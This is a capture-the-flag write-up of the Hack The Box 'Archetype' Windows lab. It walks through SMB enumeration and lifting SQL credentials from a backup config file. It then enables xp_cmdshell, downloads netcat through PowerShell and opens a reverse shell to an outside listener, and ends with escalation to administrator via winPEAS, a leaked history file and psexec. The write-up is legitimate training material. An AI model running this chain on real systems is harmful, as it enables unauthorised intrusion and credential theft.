# Archetype - Hack The Box
**OS:** Windows
**Difficulty:** Very Easy

## Enumeration
Enumeration is always the first step.
Run:
```bash
nmap -sC -sV <target>
```
I noticed that there are SMB ports open, and a microsoft SQL server running on port 1433.

## SMB enumeration
run:
```bash
smbclient -N -L \\\\<target>\\
```
A few shares come up, and the backups share seems to be accessible.
I then enumerated the backups share.
```bash
smbclient -L \\\\<target>\\backups
```
A file comes up after running this, called prod.dtscConfig
I downloaded it using ```get```.
I checked the contents of the file using ```cat```, and noticed that there is a password for the user ```archetype/sql_svc```, which is ```M3g4c0rp123```.
The ```sql_svc``` part of the user suggested that these are the credentials to a user on the SQL server, so I then used impacket mssqlclient.
## Impacket
Since I did all of this in kali, there was no need for me to install anything.
I ran:
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@<target> -windows-auth
```
and then entered the password I previously retrieved.
After this, I had access to the mssql server :)
## Foothold
After connecting, It is useful to run the ```help``` command to see what commands we have access to.
I checked if this user is a sysadmin:
```SQL
SELECT is_srvrolemember('sysadmin');
```
and the output was ```1```, which means true.

## xp_cmdshell
Something very interesting I've learned through this box was ```xp_cmdshell```.
It basically allows us to run cmd commands through the ms sql server.
I checked if it was enabled, but it wasn't.
I had to run these commands to enable it:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
Now we can run commands!

## Getting a reverse shell
I opened a python http server on port 80
```bash
python3 -m http.server 80
```
and opened a netcat listener on port 443
```bash
nc -lvnp 443
```
#### quick flag explanation:
- -l: listen
- -v: verbose
- -n no DNS resolution
- -p 443: use port 443
#### back to reverse shell
in the same directory that I ran those commands, i has nc64.exe, which is a netcat binary for windows.
I used ```xp_cmdshell "powershell -c <command>``` to use powershell, as it gives us more features compared to xp_cmdshell alone.
I had to find a directory where I could download the netcat binary with my level of privilege.
I found that the Downloads folder worked, so I downloaded the binary to that folder.
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://<target>/nc64.exe -outfile nc64.exe"
```
Now we can bind cmd.exe throught the nc binary to our listener.
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
<target> 443"
```
After going back to the netcat tab I had running, cmd was running through it.
## Privilege escalation
for privilege escalation, I use winPEAS, which automated the process.
I used the python http server running on port 80, and ran:
```
powershell
wget http://<target>/winPEASx64.exe -outfile winPEASx64.exe
```
and simply ran it
```
.\winPEASx64.exe
```
There was ```SeImpersonatePrivilege```, which is apparently vulnerable to the "juicy potato exploit", but I also noticed that there are some files that could contain credentials. One of these files was ```ConsoleHost_history.txt```.
I navigated to that file and printed its contents, only to find the admin password.
## Finally escalating privilege
another tool from impacket, ```psexec```, which gives us direct shell access through SMB.
```bash
impacket-psexec administrator@<target>
```
I entered the password, and got admin access :)
I went to the desktop, and found the flag